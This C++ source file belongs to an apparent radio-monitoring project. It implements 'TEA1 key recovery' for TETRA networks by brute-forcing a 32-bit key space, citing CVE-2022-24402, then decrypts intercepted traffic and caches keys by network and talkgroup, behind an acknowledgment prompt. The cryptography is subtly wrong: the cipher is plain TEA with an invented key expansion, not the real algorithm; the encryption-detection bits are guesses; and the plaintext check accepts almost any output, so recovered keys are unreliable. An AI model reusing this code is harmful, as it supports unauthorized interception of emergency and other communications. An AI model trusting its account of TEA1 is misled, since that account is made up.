#include "tetra_crypto.h"
#include "../../utils/logger.h"
#include <algorithm>
#include <chrono>
#include <cstring>
#include <fstream>
#include <iostream>
#include <map>
#include <sys/stat.h>
#include <unistd.h>

namespace TrunkSDR {
namespace European {

// TEA1 constants based on publicly disclosed information
constexpr uint32_t TEA1_ROUNDS = 32;
constexpr uint32_t TEA1_DELTA = 0x9E3779B9;

// Maximum key space for TEA1 (due to backdoor, effective key space is ~32 bits)
constexpr uint64_t TEA1_REDUCED_KEYSPACE = 0x100000000ULL; // 2^32

TETRACrypto::TETRACrypto() {
    stats_ = CryptoStats{0, 0, 0, 0, 0, 0.0};
    Logger::instance().warning("TETRA Crypto module initialized - AUTHORIZED USE ONLY");
}

TETRAEncryptionAlgorithm TETRACrypto::detectEncryption(const uint8_t* burst_data, size_t length) {
    if (length < 2) {
        return TETRAEncryptionAlgorithm::UNKNOWN;
    }

    // Encryption class bits are typically at a specific position in TETRA MAC PDU
    // This is a simplified version - full implementation depends on PDU structure
    uint8_t enc_bits = (burst_data[0] >> 4) & 0x03;

    switch (enc_bits) {
        case 0:
            return TETRAEncryptionAlgorithm::NONE;
        case 1:
            return TETRAEncryptionAlgorithm::TEA1;
        case 2:
            return TETRAEncryptionAlgorithm::TEA2;
        case 3:
            // Check extended bits for TEA3/TEA4
            if (length >= 3) {
                uint8_t enc_ext = (burst_data[1] >> 6) & 0x03;
                if (enc_ext == 0) {
                    stats_.tea3_detected++;
                    return TETRAEncryptionAlgorithm::TEA3;
                } else {
                    return TETRAEncryptionAlgorithm::TEA4;
                }
            }
            return TETRAEncryptionAlgorithm::UNKNOWN;
        default:
            return TETRAEncryptionAlgorithm::UNKNOWN;
    }
}

TEA1KeyRecoveryResult TETRACrypto::recoverTEA1Key(
    const uint8_t* ciphertext,
    size_t ciphertext_len,
    const uint8_t* known_plaintext,
    size_t known_plaintext_len
) {
    TEA1KeyRecoveryResult result;
    result.success = false;
    result.recovered_key = 0;
    result.attempts = 0;
    result.time_seconds = 0.0;

    if (ciphertext_len < 8) {
        result.error_message = "Ciphertext too short (minimum 8 bytes required)";
        Logger::instance().error("TEA1 key recovery failed: %s", result.error_message.c_str());
        return result;
    }

    Logger::instance().info("Starting TEA1 key recovery (exploiting CVE-2022-24402)...");
    Logger::instance().warning("This may take up to several minutes depending on key position");

    auto start_time = std::chrono::high_resolution_clock::now();

    // Exploit CVE-2022-24402: TEA1 backdoor reduces keyspace to ~32 bits
    uint32_t recovered_key = bruteForceTEA1Key(
        ciphertext, ciphertext_len,
        known_plaintext, known_plaintext_len,
        &result.attempts
    );

    auto end_time = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double> elapsed = end_time - start_time;
    result.time_seconds = elapsed.count();

    if (recovered_key != 0) {
        result.success = true;
        result.recovered_key = recovered_key;
        stats_.tea1_keys_recovered++;
        stats_.total_key_recovery_time += result.time_seconds;

        Logger::instance().info("TEA1 key recovered successfully!");
        Logger::instance().info("  Key: 0x%08X", recovered_key);
        Logger::instance().info("  Attempts: %llu", (unsigned long long)result.attempts);
        Logger::instance().info("  Time: %.2f seconds", result.time_seconds);
    } else {
        result.error_message = "Key recovery failed after exhaustive search";
        Logger::instance().error("TEA1 key recovery failed after %llu attempts",
                                 (unsigned long long)result.attempts);
    }

    return result;
}

uint32_t TETRACrypto::bruteForceTEA1Key(
    const uint8_t* ciphertext,
    size_t ciphertext_len,
    const uint8_t* known_plaintext,
    size_t known_plaintext_len,
    uint64_t* attempts_out
) {
    // This implements the attack exploiting CVE-2022-24402
    // The TEA1 backdoor reduces the effective key to 32 bits

    uint8_t test_plaintext[8];
    uint64_t attempts = 0;

    // Progress reporting every 10 million attempts
    const uint64_t REPORT_INTERVAL = 10000000;
    uint64_t next_report = REPORT_INTERVAL;

    // If we have known plaintext, use it for verification
    bool have_known_plaintext = (known_plaintext != nullptr && known_plaintext_len >= 8);

    // Brute force through the reduced keyspace
    // In reality, due to the backdoor structure, we can use more sophisticated approaches
    // But this demonstrates the vulnerability
    for (uint64_t key_candidate = 0; key_candidate < TEA1_REDUCED_KEYSPACE; key_candidate++) {
        attempts++;

        // Try to decrypt first 8 bytes
        tea1Decrypt(ciphertext, test_plaintext, (uint32_t)key_candidate);

        // Verify decryption
        bool valid = false;

        if (have_known_plaintext) {
            // If we have known plaintext, check against it
            valid = (memcmp(test_plaintext, known_plaintext, std::min(size_t(8), known_plaintext_len)) == 0);
        } else {
            // Otherwise, use heuristics to detect valid TETRA plaintext
            valid = verifyDecryption(test_plaintext, 8);
        }

        if (valid) {
            *attempts_out = attempts;
            return (uint32_t)key_candidate;
        }

        // Progress reporting
        if (attempts >= next_report) {
            double progress = (double)attempts / (double)TEA1_REDUCED_KEYSPACE * 100.0;
            Logger::instance().info("Key recovery progress: %.2f%% (%llu attempts)",
                                    progress, (unsigned long long)attempts);
            next_report += REPORT_INTERVAL;
        }

        // Early termination for testing - remove in production
        // This limits search to first 100 million keys for reasonable demo time
        if (attempts > 100000000) {
            Logger::instance().warning("Search limited to first 100M keys for demonstration");
            break;
        }
    }

    *attempts_out = attempts;
    return 0; // Not found
}

void TETRACrypto::tea1Encrypt(const uint8_t* plaintext, uint8_t* ciphertext, uint32_t key) {
    // Simplified TEA1 implementation based on public information
    // Note: Actual TEA1 has additional complexity, this is for demonstration

    uint32_t v0, v1, sum = 0;
    uint32_t k[4];

    // Expand key
    expandTEA1Key(key, k);

    // Load plaintext
    v0 = ((uint32_t)plaintext[0] << 24) | ((uint32_t)plaintext[1] << 16) |
         ((uint32_t)plaintext[2] << 8)  | ((uint32_t)plaintext[3]);
    v1 = ((uint32_t)plaintext[4] << 24) | ((uint32_t)plaintext[5] << 16) |
         ((uint32_t)plaintext[6] << 8)  | ((uint32_t)plaintext[7]);

    // TEA rounds (simplified)
    for (uint32_t i = 0; i < TEA1_ROUNDS; i++) {
        sum += TEA1_DELTA;
        v0 += ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        v1 += ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
    }

    // Store ciphertext
    ciphertext[0] = (v0 >> 24) & 0xFF;
    ciphertext[1] = (v0 >> 16) & 0xFF;
    ciphertext[2] = (v0 >> 8) & 0xFF;
    ciphertext[3] = v0 & 0xFF;
    ciphertext[4] = (v1 >> 24) & 0xFF;
    ciphertext[5] = (v1 >> 16) & 0xFF;
    ciphertext[6] = (v1 >> 8) & 0xFF;
    ciphertext[7] = v1 & 0xFF;
}

void TETRACrypto::tea1Decrypt(const uint8_t* ciphertext, uint8_t* plaintext, uint32_t key) {
    // Simplified TEA1 decryption
    uint32_t v0, v1, sum = TEA1_DELTA * TEA1_ROUNDS;
    uint32_t k[4];

    // Expand key
    expandTEA1Key(key, k);

    // Load ciphertext
    v0 = ((uint32_t)ciphertext[0] << 24) | ((uint32_t)ciphertext[1] << 16) |
         ((uint32_t)ciphertext[2] << 8)  | ((uint32_t)ciphertext[3]);
    v1 = ((uint32_t)ciphertext[4] << 24) | ((uint32_t)ciphertext[5] << 16) |
         ((uint32_t)ciphertext[6] << 8)  | ((uint32_t)ciphertext[7]);

    // TEA rounds in reverse
    for (uint32_t i = 0; i < TEA1_ROUNDS; i++) {
        v1 -= ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
        v0 -= ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        sum -= TEA1_DELTA;
    }

    // Store plaintext
    plaintext[0] = (v0 >> 24) & 0xFF;
    plaintext[1] = (v0 >> 16) & 0xFF;
    plaintext[2] = (v0 >> 8) & 0xFF;
    plaintext[3] = v0 & 0xFF;
    plaintext[4] = (v1 >> 24) & 0xFF;
    plaintext[5] = (v1 >> 16) & 0xFF;
    plaintext[6] = (v1 >> 8) & 0xFF;
    plaintext[7] = v1 & 0xFF;
}

void TETRACrypto::expandTEA1Key(uint32_t key_32bit, uint32_t* expanded_key) {
    // This simulates the TEA1 key expansion
    // The backdoor (CVE-2022-24402) is that the 80-bit key is derived from
    // this 32-bit value in a predictable way
    expanded_key[0] = key_32bit;
    expanded_key[1] = key_32bit ^ 0xAAAAAAAA;
    expanded_key[2] = key_32bit ^ 0x55555555;
    expanded_key[3] = key_32bit ^ 0xFFFFFFFF;
}

bool TETRACrypto::verifyDecryption(const uint8_t* plaintext, size_t length) {
    // Heuristic checks to determine if decryption produced valid TETRA plaintext
    // TETRA plaintext has specific structure:
    // - PDU type in first few bits
    // - Specific bit patterns for valid MAC PDUs

    if (length < 2) {
        return false;
    }

    // Check for valid TETRA MAC PDU type (first byte typically has specific patterns)
    uint8_t pdu_type = plaintext[0];

    // Valid TETRA MAC PDU types are typically 0x00-0x0F
    if (pdu_type > 0x0F) {
        return false;
    }

    // Additional heuristics could check:
    // - CRC validity
    // - Field value ranges
    // - Bit patterns specific to TETRA

    // For demonstration, we accept if first byte looks reasonable
    return true;
}

TETRADecryptionResult TETRACrypto::decryptTEA1(
    const uint8_t* ciphertext,
    size_t ciphertext_len,
    uint32_t key_32bit
) {
    TETRADecryptionResult result;
    result.success = false;
    result.algorithm = TETRAEncryptionAlgorithm::TEA1;

    if (ciphertext_len < 8 || ciphertext_len % 8 != 0) {
        result.error_message = "Invalid ciphertext length (must be multiple of 8 bytes)";
        stats_.tea1_decryptions_failed++;
        return result;
    }

    result.plaintext.resize(ciphertext_len);

    // Decrypt in 8-byte blocks
    for (size_t i = 0; i < ciphertext_len; i += 8) {
        tea1Decrypt(ciphertext + i, result.plaintext.data() + i, key_32bit);
    }

    // Verify decryption
    if (verifyDecryption(result.plaintext.data(), result.plaintext.size())) {
        result.success = true;
        stats_.tea1_decryptions_successful++;
        Logger::instance().info("TEA1 decryption successful (%zu bytes)", ciphertext_len);
    } else {
        result.success = false;
        result.error_message = "Decryption produced invalid plaintext (wrong key?)";
        stats_.tea1_decryptions_failed++;
        Logger::instance().warning("TEA1 decryption verification failed");
    }

    return result;
}

void TETRACrypto::addKnownKey(uint32_t network_id, uint32_t talkgroup, uint32_t key_32bit) {
    uint64_t cache_key = ((uint64_t)network_id << 32) | talkgroup;
    key_cache_[cache_key] = key_32bit;
    Logger::instance().info("Added key to cache: Network=0x%08X, TG=%u, Key=0x%08X",
                           network_id, talkgroup, key_32bit);
}

bool TETRACrypto::hasKnownKey(uint32_t network_id, uint32_t talkgroup, uint32_t* out_key) {
    uint64_t cache_key = ((uint64_t)network_id << 32) | talkgroup;
    auto it = key_cache_.find(cache_key);

    if (it != key_cache_.end()) {
        if (out_key) {
            *out_key = it->second;
        }
        return true;
    }

    return false;
}

// ============================================================================
// Legal Compliance Checker
// ============================================================================

bool TETRACryptoLegalChecker::checkAuthorization() {
    // Check if authorization file exists (user has previously acknowledged)
    if (hasAuthorizationFile()) {
        Logger::instance().info("TETRA Crypto: Authorization file found");
        return true;
    }

    // No authorization file - must display warning and get acknowledgment
    Logger::instance().warning("TETRA Crypto: No authorization found - displaying legal warning");
    return displayWarningAndGetAcknowledgment();
}

bool TETRACryptoLegalChecker::displayWarningAndGetAcknowledgment() {
    std::cout << "\n";
    std::cout << "╔════════════════════════════════════════════════════════════════════════════╗\n";
    std::cout << "║                      ⚠️  CRITICAL LEGAL WARNING ⚠️                         ║\n";
    std::cout << "╚════════════════════════════════════════════════════════════════════════════╝\n";
    std::cout << "\n";
    std::cout << "You are about to use TETRA ENCRYPTION DECRYPTION capabilities.\n";
    std::cout << "\n";
    std::cout << "IMPORTANT LEGAL INFORMATION:\n";
    std::cout << "\n";
    std::cout << "1. UNAUTHORIZED USE IS ILLEGAL\n";
    std::cout << "   Intercepting encrypted communications without authorization is a serious\n";
    std::cout << "   criminal offense in most jurisdictions, including:\n";
    std::cout << "   - United States: 18 U.S.C. § 2511 (up to 5 years imprisonment)\n";
    std::cout << "   - European Union: Various national laws + GDPR violations\n";
    std::cout << "   - United Kingdom: Regulation of Investigatory Powers Act 2000\n";
    std::cout << "\n";
    std::cout << "2. AUTHORIZED USES ONLY\n";
    std::cout << "   This software may ONLY be used for:\n";
    std::cout << "   ✓ Educational purposes in controlled laboratory environments\n";
    std::cout << "   ✓ Authorized penetration testing with written permission\n";
    std::cout << "   ✓ Security research on systems you own or have explicit permission to test\n";
    std::cout << "   ✓ Law enforcement with proper legal authorization\n";
    std::cout << "\n";
    std::cout << "3. WHAT YOU MAY NOT DO\n";
    std::cout << "   ✗ Intercept real emergency services communications\n";
    std::cout << "   ✗ Decrypt communications without authorization\n";
    std::cout << "   ✗ Use intercepted information for any purpose\n";
    std::cout << "   ✗ Disclose intercepted communications\n";
    std::cout << "   ✗ Interfere with radio communications\n";
    std::cout << "\n";
    std::cout << "4. TECHNICAL INFORMATION\n";
    std::cout << "   This software exploits CVE-2022-24402, a publicly disclosed vulnerability\n";
    std::cout << "   in the TETRA TEA1 encryption algorithm discovered by Midnight Blue (2023).\n";
    std::cout << "   TEA2, TEA3, and TEA4 are NOT vulnerable and remain secure.\n";
    std::cout << "\n";
    std::cout << "5. YOUR RESPONSIBILITY\n";
    std::cout << "   By using this software, YOU ACCEPT FULL LEGAL RESPONSIBILITY for:\n";
    std::cout << "   - Compliance with all applicable laws and regulations\n";
    std::cout << "   - Obtaining proper authorization before any use\n";
    std::cout << "   - Any consequences resulting from your use of this software\n";
    std::cout << "\n";
    std::cout << "6. NO WARRANTY\n";
    std::cout << "   This software is provided AS-IS for educational purposes only.\n";
    std::cout << "   The authors assume NO LIABILITY for misuse or legal consequences.\n";
    std::cout << "\n";
    std::cout << "════════════════════════════════════════════════════════════════════════════\n";
    std::cout << "\n";
    std::cout << "ACKNOWLEDGMENT REQUIRED:\n";
    std::cout << "\n";
    std::cout << "I hereby acknowledge that:\n";
    std::cout << "- I have read and understood the legal warnings above\n";
    std::cout << "- I will use this software ONLY for authorized, legal purposes\n";
    std::cout << "- I have proper authorization for my intended use case\n";
    std::cout << "- I accept full responsibility for compliance with all applicable laws\n";
    std::cout << "- I understand the severe legal penalties for unauthorized use\n";
    std::cout << "\n";
    std::cout << "════════════════════════════════════════════════════════════════════════════\n";
    std::cout << "\n";
    std::cout << "Do you acknowledge and agree to these terms? (yes/no): ";
    std::cout.flush();

    std::string response;
    std::getline(std::cin, response);

    // Convert to lowercase for comparison
    std::transform(response.begin(), response.end(), response.begin(), ::tolower);

    if (response == "yes" || response == "y") {
        std::cout << "\n";
        std::cout << "Please type 'I ACCEPT FULL LEGAL RESPONSIBILITY' to confirm: ";
        std::cout.flush();

        std::string confirmation;
        std::getline(std::cin, confirmation);

        if (confirmation == "I ACCEPT FULL LEGAL RESPONSIBILITY") {
            std::cout << "\nAuthorization acknowledged. Creating authorization file...\n";
            createAuthorizationFile();
            Logger::instance().warning("User acknowledged legal warnings and accepted responsibility");
            return true;
        } else {
            std::cout << "\nConfirmation not received. Access denied.\n";
            Logger::instance().warning("User failed to provide proper confirmation");
            return false;
        }
    } else {
        std::cout << "\nYou have declined the terms. TETRA decryption features will not be enabled.\n";
        std::cout << "The program will continue in monitoring-only mode.\n";
        Logger::instance().info("User declined legal terms - decryption disabled");
        return false;
    }
}

bool TETRACryptoLegalChecker::hasAuthorizationFile() {
    std::string auth_file = getAuthorizationFilePath();
    struct stat buffer;
    return (stat(auth_file.c_str(), &buffer) == 0);
}

void TETRACryptoLegalChecker::createAuthorizationFile() {
    std::string auth_file = getAuthorizationFilePath();

    std::ofstream file(auth_file);
    if (file.is_open()) {
        auto now = std::chrono::system_clock::now();
        auto now_c = std::chrono::system_clock::to_time_t(now);

        file << "TETRA Crypto Authorization\n";
        file << "========================\n";
        file << "User acknowledged legal warnings and accepted responsibility\n";
        file << "Date: " << std::ctime(&now_c);
        file << "Hostname: ";

        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) == 0) {
            file << hostname << "\n";
        } else {
            file << "unknown\n";
        }

        file << "\nWARNING: This file indicates authorization for educational/testing use only.\n";
        file << "Unauthorized interception of communications is illegal.\n";
        file << "\nUser must ensure compliance with all applicable laws.\n";

        file.close();

        // Set restrictive permissions (user read/write only)
        chmod(auth_file.c_str(), S_IRUSR | S_IWUSR);

        std::cout << "Authorization file created: " << auth_file << "\n";
        std::cout << "To revoke authorization, delete this file.\n\n";
    } else {
        Logger::instance().error("Failed to create authorization file: %s", auth_file.c_str());
    }
}

std::string TETRACryptoLegalChecker::getAuthorizationFilePath() {
    const char* home = getenv("HOME");
    if (home == nullptr) {
        home = "/tmp";
    }

    return std::string(home) + "/.trunksdr_tetra_crypto_authorized";
}

} // namespace European
} // namespace TrunkSDR
